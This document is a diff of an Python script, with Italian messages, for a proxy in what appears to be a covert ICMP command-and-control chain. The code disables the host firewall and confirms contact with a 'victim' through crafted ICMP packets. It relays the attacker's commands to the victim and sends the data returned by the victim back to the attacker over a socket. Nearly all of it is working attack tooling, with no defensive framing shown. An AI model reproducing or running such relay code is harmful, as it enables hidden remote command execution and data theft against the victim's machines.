@@ -24,78 +24,29 @@ directory = os.path.dirname(file_path)
 sys.path.insert(0, directory)
 import attacksingleton 
 
-
-
-#------------------------------------  
-def callback_wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, event_pktconn:threading.Event): 
-    def callback(packet):
-        print(f"callback wait_conn_from_victim received:\n\t{packet.summary()}") 
-        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):   
-            #print(f"Ricevuto pacchetto da {packet[IP].src}...")
-            confirm_text=CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed
-            check_sum=mycalc.checksum(confirm_text.encode()) 
-            if check_sum==packet[ICMP].id and ip_vittima.compressed==packet[IP].src: 
-                print(f"Il pacchetto ha confermato la connessione...") 
-                threadevent.set(event_pktconn) 
-                return
-        print(f"Il pacchetto non ha confermato la connessione...")
-    return callback  
-
 #--------------------------------
 def update_victim_end_communication(ip_vittima:ipaddress.IPv4Address):
     if not istype.ipaddress(ip_vittima):
         raise Exception(f"Argomenti non validi {type(ip_vittima)}") 
     data=END_COMMUNICATION
-    if mysniffer.send_packet(data.encode(),ip_dst=ip_vittima):
-        print(f"{ip_vittima}: la vittima è stata aggiornata")
-        return
-    print(f"{ip_vittima}: la vittima non è stata aggiornata")
+    mysniffer.send_packet(data.encode(),ip_dst=ip_vittima)
+    print(f"{ip_vittima}: la vittima stata aggiornata")
 
-def wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, thread_lock:threading.Lock, thread_response:dict[str, bool]):
-        #print("\n(─‿─)\twait_conn_from_victim\n")
-        try:
-            confirm_text=CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed
-            checksum=mycalc.calc_checksum(confirm_text.encode())
-            interface,_=ipinterface.iface_src_from_IP(ip_vittima)
-            event_pktconn=get.threading_Event()
-            filter=attacksingleton.get_filter_connection_from_function(
-                "wait_conn_from_victim"
-                ,ip_vittima
-                ,checksum
-            ) 
-        except Exception as e:
-            print(f"wait_conn_from_victim filter: {e}")
-            return False
-        try:
-            args={
-                "filter":filter
-                #,"count":1 
-                ,"prn":callback_wait_conn_from_victim(
-                    ip_vittima
-                    ,ip_host
-                    ,event_pktconn
-                )
-                #,"store":True 
-                ,"iface":interface
-            } 
-            sniffer,pkt_timer=mysniffer.sniff_packet(args,event=event_pktconn) 
-            threadevent.wait(event_pktconn)
-        except Exception as e:
-            raise Exception(f"wait_conn_from_victim sniffer: {e}") 
-        mysniffer.stop(sniffer)
-        if res:=mytimer.stop(pkt_timer): 
-            print(f"La connessione per {ip_vittima} è confermata")  
-        else: 
-            print(f"La connessione per {ip_vittima} non è confermata") 
-        mythread.update_thread_response(
-            ip_host
-            ,thread_lock
-            ,thread_response
-            ,res
-        )
-        return res
+def wait_data_from_vicitm(ip_src:ipaddress.IPv4Address, ip_dst:ipaddress.IPv4Address, attack_function:dict, data_received:list): 
+    if not (istype.ipaddress(ip_src) and istype.ipaddress(ip_dst) and istype.dictionary(attack_function) and istype.list(data_received)):
+        raise Exception(f"wait_data_from_vicitm: Argomenti non validi")
+    try: 
+        print(f"Tramite l'attacco {attack_function[0][1]} aspetto che {ip_src} mandi i dati")   
+        attacksingleton.wait_data(
+            attack_function
+            ,ip_dst
+            ,data_received
+            ,ip_src 
+        )  
+    except Exception as e:
+        raise Exception(f"wait_data_from_vicitm: {e}") 
 
-def confirm_conn_of_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, socket_attacker:socket.socket, result:bool):
+def confirm_att_about_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, socket_attacker:socket.socket, result:bool):
     try: 
         data=CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed+str(result)
         socket_attacker.sendall(data.encode()) 
@@ -105,40 +56,80 @@ def confirm_conn_of_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.I
             raise Exception(f"\t***{ip_host} non è connesso a {ip_vittima}") 
         print(f"\t***{ip_host} è connesso a {ip_vittima}")  
     except Exception as e: 
-        print(f"confirm_conn_of_victim: {e}")
-        exit(1) 
-
-def wait_data_from_vicitm(ip_src:ipaddress.IPv4Address, ip_dst:ipaddress.IPv4Address, attack_function:dict, data_received:list): 
-    if not istype.ipaddress(ip_src) or not istype.dictionary(attack_function) or not istype.list(data_received):
-        raise Exception(f"Argomenti non validi: {type(ip_src)} {type(attack_function)} {type(data_received)}")
-    try: 
-        print(f"Tramite l'attacco {attack_function} aspetto che {ip_src} mandi i dati")   
-        attacksingleton.wait_data(
-            attack_function
-            ,ip_src=ip_src
-            ,ip_dst=ip_dst
-            ,information_data=data_received
-        )  
-    except Exception as e:
-        raise Exception(f"wait_data_from_vicitm: {e}") 
+        print(f"confirm_att_about_victim: {e}")
+        exit(1)  
 
 #--------------------------------
-def setup_thread(callback_function=None,ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address=None): 
-    try:  
-        #istype.callable_function(callback_function)
-        if not istype.ipaddress(ip_host):
-            raise Exception("ip_host non è ne un IPv4Address ne un IPv6Address")
-        if not istype.callable_function(callback_function):
-            raise ValueError("La callback function passata non è chiamabile")  
+def callback_wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, event_pktconn:threading.Event): 
+    print("Monitoraggio del traffico per la conferma di connessione dalla vittima")
+    def callback(packet): 
+        nonlocal ip_vittima, ip_host, event_pktconn
+        print(f"callback wait_conn_from_victim received:\n\t{packet.summary()}") 
+        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):   
+            #print(f"Ricevuto pacchetto da {packet[IP].src}...")
+            confirm_text=(CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed)
+            check_sum=mycalc.checksum(confirm_text.encode()) 
+            if confirm_text in packet[Raw].load.decode() and ip_vittima.compressed==packet[IP].src: 
+                print(f"La vititma ha confermato la connessione...") 
+                threadevent.set(event_pktconn) 
+                return
+        print(f"La vittima non ha confermato la connessione...")
+    return callback  
+
+def wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, thread_lock:threading.Lock, thread_response:dict[str, bool]):
+    try:
+        confirm_text=CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed
+        checksum=mycalc.checksum(confirm_text.encode())
+        interface=ipinterface.iface_from_IP(ip_vittima)
+        event_pktconn=get.threading_Event()
+        #filter=attacksingleton.get_filter_connection_from_function(
+        #    "wait_conn_from_victim"
+        #    ,ip_vittima
+        #    ,checksum
+        #) 
+        IPv4_ECHO_REQUEST_TYPE=8
+        IPv4_ECHO_REPLY_TYPE=0
+        filter=f"icmp and (icmp[0]=={IPv4_ECHO_REQUEST_TYPE} or icmp[0]=={IPv4_ECHO_REPLY_TYPE}) and src {ip_vittima.compressed} and dst {ip_host.compressed} and icmp[4:2]={checksum}"
     except Exception as e:
-        raise Exception(f"setup_thread: {e}")
-   
-    thread_lock=threading.Lock()
-    print(f"Lock creato:\t{thread_lock}") 
-    thread_response={ip_host.compressed:False}
-    print(f"Risposte create:\t{thread_response}")
-    thread_dict={ip_host.compressed:threading.Thread( target=callback_function)}  
-    print(f"Thread creato:\t{thread_dict}")
+        raise Exception(f"wait_conn_from_victim variabili: {e}") 
+    try:
+        args={
+            "filter":filter
+            #,"count":1 
+            ,"prn":callback_wait_conn_from_victim(
+                ip_vittima
+                ,ip_host
+                ,event_pktconn
+            )
+            #,"store":True 
+            ,"iface":interface
+        } 
+        callback_func_timer=lambda: mysniffer.template_timeout(event_pktconn) 
+        sniffer,pkt_timer=mysniffer.sniff_packet(args=args,callback_func_timer=callback_func_timer) 
+    except Exception as e:
+        raise Exception(f"wait_conn_from_victim sniffer: {e}")  
+    threadevent.wait(event_pktconn) 
+    if res:= mysniffer.stop(sniffer) and mytimer.stop(pkt_timer): 
+        print(f"La connessione per {ip_vittima} è confermata")  
+    else: 
+        print(f"La connessione per {ip_vittima} non è confermata") 
+    mythread.update_thread_response(
+        ip_host
+        ,thread_lock
+        ,thread_response
+        ,res
+    )
+    return res
+
+#--------------------------------
+def setup_thread(callback_function=None,ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address=None):  
+    if not istype.ipaddress(ip_host):
+        raise Exception("setup_thread:ip_host non è ne un IPv4Address ne un IPv6Address") 
+    if not istype.callable_function(callback_function): 
+        raise ValueError("setup_thread:La callback function passata non è chiamabile")  
+    thread_lock=threading.Lock() 
+    thread_response={ip_host.exploded:False} 
+    thread_dict={ip_host.exploded:threading.Thread( target=callback_function)}   
     return thread_lock, thread_response, thread_dict
 
 def setup_server(ip_attaccante:ipaddress.IPv4Address|ipaddress.IPv6Address):
@@ -162,43 +153,29 @@ def setup_server(ip_attaccante:ipaddress.IPv4Address|ipaddress.IPv6Address):
                 exit(0) 
     return data_received, socket_attacker
 
-def find_local_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    print(localIP:=s.getsockname()[0])
-    s.close()
-    return localIP
-
 def update_data_received(data, data_lock:threading.Lock, data_received):
     data_lock.acquire()
     data_received.append(data)
     data_lock.release() 
 
 #--------------------------------
-def check_value_in_parser(args):  
-    if not isinstance(args,argparse.Namespace): 
-        raise Exception(f"Argomento parser non è istanza di argparse.Namespace")  
-    if not isinstance(args.ip_attaccante,str): 
-        raise Exception(f"--ip_attaccante non specificato: {args.ip_attaccante}")
-    #if not isinstance(args.ip_vittima,str):  
-    #    raise Exception(f"--ip_vittima non specificato: {args.ip_vittima}") 
-    return True
-
 def get_args_from_parser(): 
-    parser = argparse.ArgumentParser()
-    #parser.add_argument("--ip_host",type=str, help="IP dell'host")
-    parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante")
-    #parser.add_argument("--ip_vittima",type=str, help="IP vittima")
-    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
+    parser = argparse.ArgumentParser() 
+    parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante") 
+    #parser.add_argument("--provaFlag",type=str, help="Comando da eseguire")
     try:
-        args, unknown =myparser.check_for_unknown_args(parser)  
+        args, unknown =myparser.check_arguments(parser)  
         if len(unknown) > 0: 
-            raise Exception(f"Argomenti sconosciuti: {unknown}") 
-        if check_value_in_parser(args):  
-            return args
+            raise Exception(f"get_args_from_parser:Argomenti sconosciuti {unknown}") 
+        if not isinstance(args,argparse.Namespace): 
+            raise Exception(f"get_args_from_parser:Argomento parser non è istanza di argparse.Namespace")  
+        if not isinstance(args.ip_attaccante,str): 
+            raise Exception(f"get_args_from_parser: --ip_attaccante non specificato {args.ip_attaccante}") 
+        return args
     except Exception as e:
+        print(f"Eccezione: {e}")
         myparser.print_supported_arguments(parser)
-        raise Exception(f"get_args_from_parser: {e}")
+    return None
 
 #--------------------------------
 class Proxy:  
@@ -206,32 +183,27 @@ class Proxy:
     def __init__(self): 
         try:
             if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
-                raise ValueError("args non è istanza di argparse.Namespace")
-            dict_values={
-                "ip_attaccante":args.ip_attaccante  
-            } 
-            self.ip_attaccante=ipaddress.ip_address(dict_values.get("ip_attaccante") )
-            print(f"IP attaccante: {type(self.ip_attaccante)} : {self.ip_attaccante}")  
-            _,ip_host=ipinterface.iface_src_from_IP(self.ip_attaccante)  
+                raise ValueError("args non istanza di argparse.Namespace") 
+            self.ip_attaccante=ipaddress.ip_address(args.ip_attaccante)
+            print(f"IP attaccante: {self.ip_attaccante}")  
+            ip_host,err=ipinterface.find_local_IP() 
+            if err:
+                raise Exception(f"inti: ip host non ricavato {err}")
+            print(f"Ip host ricavato {ip_host}")
             self.ip_host=ipaddress.ip_address(ip_host)
-            print(f"IP host: {type(self.ip_host)} : {self.ip_host}")
-            self.ip_vittima=None
-            print(f"IP vittima: {type(self.ip_vittima)} : {self.ip_vittima}")
-            self.attack_function={} 
-            print(f"Func attacco: {type(self.attack_function)} : {self.attack_function}") 
+            self.ip_vittima=None 
+            self.attack_function={}  
         except Exception as e: 
-            print(f"_init_ setup args: {e}")
-            exit(1)
-        print("")
-        disable_firewall()
+            print(f"Eccezione: {e}") 
+            exit(1) 
         try:
+            disable_firewall()
             if self.DEBUG:
                 self.debug_connection_with_attacker()
             else:
-                self.connection_with_attacker()
-            print("")
-            self.connection_with_victim()
-            print("")
+                self.connection_with_attacker() 
+            if not self.connection_with_victim(): 
+                raise Exception("Macchina non connessa alla vittima") 
             if self.DEBUG:
                 self.debug_wait_command_from_attacker()
             else: 
@@ -270,21 +242,24 @@ class Proxy:
             print(f"File di configurazione {path_of_file} caricato correttamente") 
             config_file= json.load(file) 
         self.attack_function = attacksingleton.AttackType().get_attack_function(config_file.get("attack_function"))
-        if not isinstance(self.attack_function, dict) or len(self.attack_function.items())!=1:
+        if not istype.dictionary(self.attack_function) or len(self.attack_function.items())!=1:
             self.attack_function=attacksingleton.choose_attack_function() 
         print(f"Attacco selezionato: {self.attack_function}") 
         self.ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))  
-        if self.ip_vittima is None or not (isinstance(self.ip_vittima, ipaddress.IPv4Address) or isinstance(self.ip_vittima, ipaddress.IPv6Address)):
+        if not istype.ipaddress(self.ip_vittima):
             raise ValueError(f"L'indirizzo IP della vittima non è valido: {self.ip_vittima}") 
         print(f"IP vittima valido: {type(self.ip_vittima) } {self.ip_vittima }") 
     
     def connection_with_victim(self):
         try: 
             self.thread_lock, self.thread_response, self.thread_dict=setup_thread(
-                lambda: wait_conn_from_victim(self.ip_vittima, self.ip_host, self.thread_lock, self.thread_response) 
-                ,self.ip_host
+                callback_function=lambda: wait_conn_from_victim(self.ip_vittima, self.ip_host, self.thread_lock, self.thread_response) 
+                ,ip_host=self.ip_host
             )
-            thread=self.thread_dict.get(self.ip_host.compressed)
+            print(f"Lock creato:\t{self.thread_lock}") 
+            print(f"Risposte per i thread create:\t{self.thread_response}") 
+            print(f"Dizionario dei thread creato:\t{self.thread_dict}")
+            thread=self.thread_dict.get(self.ip_host.exploded)
             thread.start()  
             
             int_version, int_code= next(iter(self.attack_function.items()))[0].replace("ipv","").split("_")
@@ -292,21 +267,18 @@ class Proxy:
             XORcode= ord("p") ^ int(int_code)
             icmp_id=(XORversion<<8)+XORcode 
             confirm_text=CONFIRM_PROXY+self.ip_vittima.compressed
-            if mysniffer.send_packet(confirm_text.encode() , self.ip_vittima, icmp_id=icmp_id): 
-                print(f"Reply: la vittima {self.ip_vittima} ha risposto") 
-                result= True 
-            else:
-                print(f"No Reply: la vittima {self.ip_vittima} non ha risposto") 
-                result= False 
+            mysniffer.send_packet(confirm_text.encode() , self.ip_vittima, icmp_id=icmp_id)
+            print("Aspetto che il thread termini")
             thread.join() 
+            print("AAAA")
             self.thread_lock.acquire()
-            result=self.thread_response.get(self.ip_host.compressed) and result
-            self.thread_lock.release()
+            result=self.thread_response.get(self.ip_host.exploded) and result
+            self.thread_lock.release() 
             if not self.DEBUG:
-                confirm_conn_of_victim(
-                    self.ip_vittima, self.ip_host, self.socket_attacker, result
-                )
                 print("Attacccante aggiornato sullo stato della connessione con la vittima")
+                confirm_att_about_victim(
+                    self.ip_vittima, self.ip_host, self.socket_attacker, result
+                ) 
         except Exception as e: 
             print(f"connection_with_victim: {e}")
             exit(1) 
@@ -322,7 +294,7 @@ class Proxy:
             )
             thread_data.start()
             #if comando is not None:
-            #   data=mymethods.CONFIRM_COMMAND+comando
+            #   data=CONFIRM_COMMAND+comando
             if CONFIRM_COMMAND in data_socket:   
                 command= data_socket.replace(CONFIRM_COMMAND,"").strip()
                 print(f"Il comando per la vittima è: {command}")
@@ -342,7 +314,7 @@ class Proxy:
             data_socket=self.socket_attacker.recv(1024).decode()
         print("Interruzione del programma")
         update_victim_end_communication(self.ip_vittima)
-        self.socket_attacker.close()   
+        self.socket_attacker.close() 
     
     def debug_wait_command_from_attacker(self): 
         msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
@@ -355,12 +327,12 @@ class Proxy:
             thread_data.start()
             print(f"Il comando per la vittima è: {command}")
             attacksingleton.send_data(self.attack_function, command.encode(), self.ip_vittima)
-            if thread_data.ident is not None:
+            if thread_data.ident is not None: 
+                print("Si apsetta che il thread termini")
                 thread_data.join()
-            print(f"wait_command_from_attacker: End thread Data received: {self.data_received}") 
-            if len(self.data_received)<=0:
-                print("Non si mandano i dati all'attaccante")
-
+            print(f"Dati ricevuti {self.data_received}") 
+            if len(self.data_received)<=0 or self.DEBUG:
+                print("Nessun dato valido. Non si mandano i dati all'attaccante") 
             command=input(msg) 
         print("Interruzione del programma")
 
